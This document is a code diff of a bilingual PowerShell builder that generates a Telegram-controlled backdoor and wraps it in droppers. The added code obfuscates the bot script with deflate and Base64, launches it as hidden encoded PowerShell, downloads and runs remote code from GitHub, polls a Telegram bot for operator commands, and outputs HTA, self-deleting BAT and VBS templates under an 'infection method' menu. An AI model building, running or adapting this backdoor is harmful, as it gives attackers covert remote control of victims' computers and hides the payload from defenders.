@@ -58,43 +58,50 @@ Function check-command
 ################################### Comprobamos si existe el cmdlet Ivoke-WebRequest y en el caso de que no exista lo cargamos ######################################
 
 if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
-$out_encoded_load_castellano = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline '
-$out_encoded_load_english = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline '
-if ($idioma -eq "English") {IEX $out_encoded_load_english} ; if ($idioma -eq "Spanish") {IEX $out_encoded_load_castellano}
-IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
+
+########################################## Funci�n para encodear en Base64 ##########################################
+function code_a_base64 {param ($code)
+$ms = New-Object IO.MemoryStream
+$action = [IO.Compression.CompressionMode]::Compress
+$cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+$sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+$code | ForEach-Object {$sw.WriteLine($_)}
+$sw.Close()
+$Compressed = [Convert]::ToBase64String($ms.ToArray())
+$command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
+"`$(New-Object IO.Compression.DeflateStream (" +
+"`$(New-Object IO.MemoryStream (,"+
+"`$([Convert]::FromBase64String('$Compressed')))), " +
+"[IO.Compression.CompressionMode]::Decompress)),"+
+" [Text.Encoding]::ASCII)).ReadToEnd();"
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
+return $codeScript
+}
 
 ############################################################### ScriptBlock del Backdoor ###############################################################
-$scriptblock = {
-param (
-[string]$botkey = "your_token",
-[string]$bot_Master_ID = "your_chat_id",
-[int]$delay = "your_delay"
-)
+$scriptblock = '
+[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay"
 IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content 
-$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
-[int]$first_connect = "1"
+$chat_id = $bot_Master_ID ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1"
 while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
     $l = $json.result.length
 	$i = 0
 if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
-	while ($i -lt $l) {
-	$offset = $json.result[$i].update_id + 1
+	while ($i -lt $l) {$offset = $json.result[$i].update_id + 1
         $comando = $json.result[$i].message.text
         test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
    	$i++
 	}
-	Start-Sleep -s $delay ;$first_connect++ 
-}
-}
-$scriptblock | Out-File bot.ps1
-$scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" | Out-File bot.ps1
-$code = Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle Hidden -EncodedOutput ; Remove-Item bot.ps1 ;  $code = $code -replace '"',""
+	Start-Sleep -s $delay ;$first_connect++}'
+$scriptblock = $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay"
+$code = code_a_base64 -code $scriptblock; $code = "powershell.exe -win hidden -enc $code"
 
 ######################################################## Tipos de Archivos #######################################################################
 
-$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
+$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu codigo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
 $your_code =  'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Your code is: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
-$plantilla_hta = "<html><head><script>var c= '$code'new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
+$plantilla_hta = "<html><head><script>var c= '$code' new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
 $plantilla_bat = '@echo off
 start /b ' + $code + '
 start /b "" cmd /c del "%~f0"&exit /b' 
@@ -122,7 +129,7 @@ command = "' + $code + '"
 objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_macro = "Cooming soon"
-############################################################### Función Expotar code a archivo ###############################################################
+############################################################### Funcion Expotar code a archivo ###############################################################
 
 
 
@@ -131,7 +138,7 @@ do
 { 
   
 
-    Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] ¿ Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
+    Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] � Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
          switch ($input) 
      {    'S' { Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Escriba la ruta para expotar el archivo : " -ForegroundColor Green -NoNewline ; $Salida = Read-Host
         $salida = (ls $salida).DirectoryName[0] ; $Salida = $salida + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida; 
@@ -160,7 +167,7 @@ do
 } 
 until ($input -eq "Y" -or $input -eq "N")}
 
-############################################################### Menú de infección Ingles ###############################################################
+############################################################### Menú de infeccion Ingles ###############################################################
 
 if ($idioma -eq "English"){
 do 
@@ -190,19 +197,19 @@ until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $inpu
 }
 
 
-############################################################### Menú de infección Castellano ###############################################################
+############################################################### Menú de infeccion Castellano ###############################################################
 
 if ($idioma -eq "Spanish"){
 do 
 { 
-     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infección`n" -ForegroundColor Green -NoNewline
+     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infeccion`n" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] ShellCode" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] BAT" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] HTA" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "4" -ForegroundColor Red -NoNewline ; Write-Host "] SCT" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "5" -ForegroundColor Red -NoNewline ; Write-Host "] VBS" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "6" -ForegroundColor Red -NoNewline ; Write-Host "] MACRO" -ForegroundColor Green -NoNewline    
-     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Seleccione opción : " -ForegroundColor Green -NoNewline ; $input = Read-Host
+     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Seleccione opcion : " -ForegroundColor Green -NoNewline ; $input = Read-Host
      switch ($input) 
      { 
             '1' { IEX $tu_codigo ; Write-Host $code
